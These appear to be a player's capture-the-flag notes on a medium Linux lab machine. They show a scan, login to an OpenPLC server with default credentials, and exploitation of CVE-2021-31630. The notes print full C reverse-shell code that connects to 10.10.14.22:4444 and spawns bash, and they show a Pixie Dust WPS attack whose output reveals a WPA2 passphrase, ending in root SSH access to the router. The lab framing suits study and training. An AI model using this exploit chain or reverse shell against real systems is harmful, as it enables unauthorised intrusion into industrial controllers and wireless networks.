# Season 4 | Linux Machine | Medium

## Port Scanning : 
		```bash
		PORT     STATE SERVICE
		22/tcp   open  ssh
		8080/tcp open  http-proxy
		```
## Foothold :

Port 8080 appears to be an openplc webserver 

+ [1] : Dirbusting -> nothing interesting
+ [2] : Code source-> nothing interesting

+ [3] : default credentials : openplc , openplc 
		RCE by injection program compiled in C - cve 2021-31630

## Revshell 
	On /hardware :

				#include <stdio.h>
				#include <sys/socket.h>
				#include <sys/types.h>
				#include <stdlib.h>
				#include <unistd.h>
				#include <netinet/in.h>
				#include <arpa/inet.h>

init function->
			    int port = 4444;
			    struct sockaddr_in revsockaddr;

			    int sockt = socket(AF_INET, SOCK_STREAM, 0);
			    revsockaddr.sin_family = AF_INET;       
			    revsockaddr.sin_port = htons(port);
			    revsockaddr.sin_addr.s_addr = inet_addr("10.10.14.22");

			    connect(sockt, (struct sockaddr *) &revsockaddr, 
			    sizeof(revsockaddr));
			    dup2(sockt, 0);
			    dup2(sockt, 1);
			    dup2(sockt, 2);

			    char * const argv[] = {"/bin/bash", NULL};
			    execvp("/bin/bash", argv);
			    
## Wifi pentesting hacktricks 

- [+] : Pixie dust : oneshot.py reveals ssid and more

		root@attica01:/tmp# python3 ./oneshot.py -i wlan0 
		Networks list:
		#    BSSID              ESSID                     Sec.     PWR  WSC device name             WSC model
		1)   02:00:00:00:01:00  plcrouter                 WPA2     -30  



## Output of oneshot.py conf file :

			ctrl_interface=/tmp/tmpdqiiy53e
			ctrl_interface_group=root
			update_config=1

			network={
				ssid="plcrouter"
				psk="NoWWEDoKnowWhaTisReal123!"
				proto=RSN
				key_mgmt=WPA-PSK
				pairwise=CCMP-256 GCMP-256 CCMP GCMP
				group=CCMP-256 GCMP-256 CCMP GCMP TKIP
				auth_alg=OPEN
				mesh_fwding=1
			}


## Connect to wifi network : 

- [+] : Follow this line by line  https://wiki.somlabs.com/index.php/Connecting_to_WiFi_network_using_systemd_and_wpa-supplicant



- [+] : wpa-cli:

			> status
			bssid=02:00:00:00:01:00
			freq=2412
			ssid=plcrouter
			id=0
			mode=station
			pairwise_cipher=CCMP
			group_cipher=CCMP
			key_mgmt=WPA2-PSK
			wpa_state=COMPLETED
			ip_address=192.168.1.84
			p2p_device_address=42:00:00:00:02:00
			address=02:00:00:00:02:00
			uuid=a134bcd4-edf6-548b-87e5-49d3aedf9b60

- [+] : ifconfig shows ip adress && netstat -nr shows 192.168.1.1

- [+] : ssh root@192.168.1.1 



